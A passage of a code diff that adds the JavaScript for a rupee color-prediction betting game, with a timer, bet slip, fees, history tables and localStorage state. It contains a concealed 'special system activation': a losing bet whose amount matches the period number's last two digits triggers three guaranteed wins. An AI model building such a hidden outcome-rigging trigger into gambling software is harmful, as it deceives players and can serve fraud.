+                gameHistory.unshift({
+                    period: currentPeriod,
+                    number: resultNumber,
+                    color: resultColor,
+                    size: resultSize
+                });
+
+                if (gameHistory.length > 50) {
+                    gameHistory.pop();
+                }
+
+                localStorage.setItem('gameHistory', JSON.stringify(gameHistory));
+
+                // Process bets
+                if (betPlaced && myBets.length > 0) {
+                    const betResult = processBet(resultNumber, resultColor, resultSize);
+
+                    if (betResult.win) {
+                        const winnings = betResult.amount;
+                        balance += winnings;
+                        updateBalance();
+
+                        winAmount.textContent = `₹${winnings.toFixed(2)}`;
+                        winBanner.style.display = 'block';
+                        setTimeout(() => {
+                            winBanner.style.display = 'none';
+                        }, 3000);
+                    } else {
+                        // Check for special system activation
+                        const lastTwoDigits = currentPeriod.slice(-2);
+                        const bet = myBets[0];
+                        const betAmountValue = parseFloat(bet.amount);
+                        if (lastTwoDigits === betAmountValue.toString().padStart(2, '0')) {
+                            guaranteedWinCount = 3;
+                            localStorage.setItem('guaranteedWinCount', guaranteedWinCount);
+                        }
+
+                        lossAmount.textContent = `₹${betAmount.toFixed(2)}`;
+                        lossBanner.style.display = 'block';
+                        setTimeout(() => {
+                            lossBanner.style.display = 'none';
+                        }, 3000);
+                    }
+
+                    betPlaced = false;
+                }
+
+                // Reset for next round
+                setTimeout(() => {
+                    currentPeriod = generatePeriodNumber();
+                    localStorage.setItem('currentPeriod', currentPeriod);
+                    timerSeconds = 60;
+
+                    bettingOptions.forEach(option => {
+                        option.classList.remove('selected', 'disabled');
+                    });
+
+                    multiplierOptions.forEach(option => {
+                        option.classList.remove('disabled');
+                    });
+
+                    randomBetButton.classList.remove('disabled');
+
+                    selectedOption = null;
+
+                    updateGameResults();
+                    displayGameHistory();
+                    displayMyBets();
+
+                    startTimer();
+                }, 3000);
+            }
+
+            function generateResult() {
+                const number = Math.floor(Math.random() * 10);
+                let color;
+                let size;
+
+                if (number === 0) {
+                    color = 'purple';
+                } else if (number % 2 === 0) {
+                    color = 'red';
+                } else {
+                    color = 'green';
+                }
+
+                size = number >= 5 ? 'big' : 'small';
+
+                return { number, color, size };
+            }
+
+            function generateGuaranteedWinResult() {
+                const bet = myBets[0];
+                let number, color, size;
+
+                if (bet.selection.type === 'number') {
+                    number = parseInt(bet.selection.value);
+                    if (number === 0) {
+                        color = 'purple';
+                    } else if (number % 2 === 0) {
+                        color = 'red';
+                    } else {
+                        color = 'green';
+                    }
+                    size = number >= 5 ? 'big' : 'small';
+                } else if (bet.selection.type === 'color') {
+                    color = bet.selection.value;
+                    if (color === 'purple') {
+                        number = 0;
+                        size = 'small';
+                    } else {
+                        const possibleNumbers = color === 'green' ? [1, 3, 5, 7, 9] : [2, 4, 6, 8];
+                        number = possibleNumbers[Math.floor(Math.random() * possibleNumbers.length)];
+                        size = number >= 5 ? 'big' : 'small';
+                    }
+                } else if (bet.selection.type === 'size') {
+                    size = bet.selection.value;
+                    const possibleNumbers = size === 'big' ? [5, 6, 7, 8, 9] : [0, 1, 2, 3, 4];
+                    number = possibleNumbers[Math.floor(Math.random() * possibleNumbers.length)];
+                    if (number === 0) {
+                        color = 'purple';
+                    } else if (number % 2 === 0) {
+                        color = 'red';
+                    } else {
+                        color = 'green';
+                    }
+                }
+
+                return { number, color, size };
+            }
+
+            function selectBettingOption(option) {
+                if (timerSeconds <= 5) return;
+
+                bettingOptions.forEach(opt => {
+                    opt.classList.remove('selected');
+                });
+
+                option.classList.add('selected');
+                selectedOption = {
+                    type: option.dataset.type,
+                    value: option.dataset.value,
+                    odds: parseFloat(option.dataset.odds)
+                };
+
+                openBetSlip();
+            }
+
+            function selectMultiplier(option) {
+                multiplierOptions.forEach(opt => {
+                    opt.classList.remove('active');
+                });
+
+                option.classList.add('active');
+                selectedMultiplier = parseFloat(option.dataset.multiplier);
+
+                if (betSlip.style.display === 'block') {
+                    updateBetDetails();
+                }
+            }
+
+            function selectRandomBet() {
+                if (timerSeconds <= 5) return;
+                const options = Array.from(bettingOptions);
+                const randomIndex = Math.floor(Math.random() * options.length);
+                selectBettingOption(options[randomIndex]);
+                displayGameHistory();
+            }
+
+            function openBetSlip() {
+                if (!selectedOption) return;
+
+                betPeriod.textContent = currentPeriod;
+
+                let selectionText;
+                if (selectedOption.type === 'color') {
+                    selectionText = selectedOption.value.charAt(0).toUpperCase() + selectedOption.value.slice(1);
+                } else if (selectedOption.type === 'number') {
+                    selectionText = `Number ${selectedOption.value}`;
+                } else {
+                    selectionText = selectedOption.value.charAt(0).toUpperCase() + selectedOption.value.slice(1);
+                }
+
+                betSelection.textContent = selectionText;
+                betOdds.textContent = `${selectedOption.odds}X`;
+                betMultiplier.textContent = `${selectedMultiplier}X`;
+
+                betSlip.style.display = 'block';
+                betAmountInput.value = '';
+                betFee.textContent = '₹0.00';
+                betActual.textContent = '₹0.00';
+
+                betAmountInput.focus();
+            }
+
+            function updateBetDetails() {
+                const amount = parseFloat(betAmountInput.value) || 0;
+                const fee = amount * 0.02;
+                const actualBet = amount - fee;
+
+                betFee.textContent = `₹${fee.toFixed(2)}`;
+                betActual.textContent = `₹${actualBet.toFixed(2)}`;
+            }
+
+            function confirmBet() {
+                const amount = parseFloat(betAmountInput.value);
+
+                if (!amount || isNaN(amount) || amount <= 0) {
+                    showAlert('Please enter a valid bet amount.');
+                    return;
+                }
+
+                if (amount > balance) {
+                    showAlert('Insufficient balance.');
+                    return;
+                }
+
+                if (timerSeconds <= 5) {
+                    showAlert('Betting closed for this round.');
+                    closeBetSlip();
+                    return;
+                }
+
+                showLoading();
+
+                setTimeout(() => {
+                    const fee = amount * 0.02;
+                    const actualBet = amount - fee;
+
+                    balance -= amount;
+                    betAmount = amount;
+
+                    totalBetAmount += amount;
+                    localStorage.setItem('totalBetAmount', totalBetAmount);
+                    updateBettingProgress(amount);
+
+                    if (totalBetAmount >= betRequirement && !withdrawalUnlocked) {
+                        withdrawalUnlocked = true;
+                        localStorage.setItem('withdrawalUnlocked', 'true');
+                    }
+
+                    updateBalance();
+                    betPlaced = true;
+
+                    myBets.unshift({
+                        period: currentPeriod,
+                        selection: {
+                            type: selectedOption.type,
+                            value: selectedOption.value
+                        },
+                        amount: amount,
+                        odds: selectedOption.odds,
+                        multiplier: selectedMultiplier,
+                        pending: true
+                    });
+
+                    localStorage.setItem('myBets', JSON.stringify(myBets));
+
+                    hideLoading();
+                    closeBetSlip();
+                    showAlert('Bet placed successfully!');
+                    displayMyBets();
+                }, 1500);
+            }
+
+            function processBet(resultNumber, resultColor, resultSize) {
+                const bet = myBets[0];
+                bet.pending = false;
+
+                let win = false;
+                let winAmount = 0;
+
+                if (guaranteedWinCount > 0) {
+                    win = true;
+                    winAmount = bet.amount * bet.odds * bet.multiplier;
+                } else {
+                    if (bet.selection.type === 'color' && bet.selection.value === resultColor) {
+                        win = true;
+                        winAmount = bet.amount * bet.odds * bet.multiplier;
+                    } else if (bet.selection.type === 'number' && parseInt(bet.selection.value) === resultNumber) {
+                        win = true;
+                        winAmount = bet.amount * bet.odds * bet.multiplier;
+                    } else if (bet.selection.type === 'size' && bet.selection.value === resultSize) {
+                        win = true;
+                        winAmount = bet.amount * bet.odds * bet.multiplier;
+                    }
+                }
+
+                bet.result = win ? 'win' : 'loss';
+                bet.winAmount = win ? winAmount : 0;
+                bet.resultDetails = {
+                    number: resultNumber,
+                    color: resultColor,
+                    size: resultSize
+                };
+
+                localStorage.setItem('myBets', JSON.stringify(myBets));
+
+                return {
+                    win: win,
+                    amount: winAmount
+                };
+            }
+
+            function closeBetSlip() {
+                betSlip.style.display = 'none';
+                bettingOptions.forEach(opt => opt.classList.remove('selected'));
+                selectedOption = null;
+                betAmountInput.value = '';
+            }
+
+            function displayGameHistory() {
+                while (gameRecordContent.children.length > 1) {
+                    gameRecordContent.removeChild(gameRecordContent.lastChild);
+                }
+
+                gameHistory.slice(0, 10).forEach(record => {
+                    const row = document.createElement('div');
+                    row.className = 'record-row';
+
+                    const periodCell = document.createElement('div');
+                    periodCell.textContent = record.period;
+
+                    const numberCell = document.createElement('div');
+                    const numberSpan = document.createElement('span');
+                    numberSpan.className = `record-number ${record.color}`;
+                    numberSpan.textContent = record.number;
+                    numberCell.appendChild(numberSpan);
+
+                    const sizeCell = document.createElement('div');
+                    sizeCell.textContent = record.size.charAt(0).toUpperCase() + record.size.slice(1);
+
+                    const colorCell = document.createElement('div');
+                    const colorIndicator = document.createElement('span');
+                    colorIndicator.className = `record-indicator ${record.color}`;
+                    colorCell.appendChild(colorIndicator);
+
+                    row.appendChild(periodCell);
+                    row.appendChild(numberCell);
+                    row.appendChild(sizeCell);
+                    row.appendChild(colorCell);
+
+                    gameRecordContent.appendChild(row);
+                });
+            }
+
+            function displayMyBets() {
+                while (myRecordContent.children.length > 1) {
+                    myRecordContent.removeChild(myRecordContent.lastChild);
+                }
+
+                myBets.slice(0, 10).forEach(bet => {
+                    const row = document.createElement('div');
+                    row.className = 'my-record-row';
+
+                    const periodCell = document.createElement('div');
+                    periodCell.textContent = bet.period;
+
+                    const selectionCell = document.createElement('div');
+                    if (bet.selection.type === 'color') {
+                        selectionCell.textContent = bet.selection.value.charAt(0).toUpperCase() + bet.selection.value.slice(1);
+                    } else if (bet.selection.type === 'number') {
+                        selectionCell.textContent = `Number ${bet.selection.value}`;
+                    } else {
+                        selectionCell.textContent = bet.selection.value.charAt(0).toUpperCase() + bet.selection.value.slice(1);
+                    }
+
+                    const amountCell = document.createElement('div');
+                    amountCell.textContent = `₹${bet.amount.toFixed(2)}`;
+                    amountCell.style.color = bet.pending ? '#ff9800' : (bet.result === 'win' ? '#4CAF50' : '#f44336');
+
+                    const resultCell = document.createElement('div');
+                    if (bet.pending) {
+                        resultCell.textContent = 'Pending';
+                        resultCell.style.color = '#ff9800';
+                    } else {
+                        resultCell.textContent = bet.result === 'win' ? 'Win' : 'Loss';
+                        resultCell.style.color = bet.result === 'win' ? '#4CAF50' : '#f44336';
+                    }
+
+                    const winAmountCell = document.createElement('div');
+                    if (bet.pending) {
+                        winAmountCell.textContent = '-';
+                        winAmountCell.style.color = '#ff9800';
+                    } else if (bet.result === 'win') {
+                        winAmountCell.textContent = `₹${bet.winAmount.toFixed(2)}`;
+                        winAmountCell.style.color = '#4CAF50';
+                    } else {
+                        winAmountCell.textContent = `-₹${bet.amount.toFixed(2)}`;
+                        winAmountCell.style.color = '#f44336';
+                    }
+
+                    row.appendChild(periodCell);
+                    row.appendChild(selectionCell);
+                    row.appendChild(amountCell);
+                    row.appendChild(resultCell);
+                    row.appendChild(winAmountCell);
+
+                    myRecordContent.appendChild(row);
+                });
+            }
+
+            function switchTab(tab) {
+                const tabName = tab.dataset.tab;
+
+                historyTabs.forEach(t => {
+                    t.classList.remove('active');
+                });
+
+                tab.classList.add('active');
+
+                if (tabName === 'game-record') {
+                    gameRecordContent.style.display = 'block';
+                    myRecordContent.style.display = 'none';
+                } else {
+                    gameRecordContent.style.display = 'none';
+                    myRecordContent.style.display = 'block';
+                }
+            }
+
+            function showAlert(message) {
+                alertMessage.textContent = message;
+                customAlert.style.display = 'block';
+            }
+
+            function closeAlert() {
+                customAlert.style.display = 'none';
+            }
+
+            function showLoading() {
+                loadingOverlay.style.display = 'flex';
+            }
+
+            function hideLoading() {
+                loadingOverlay.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
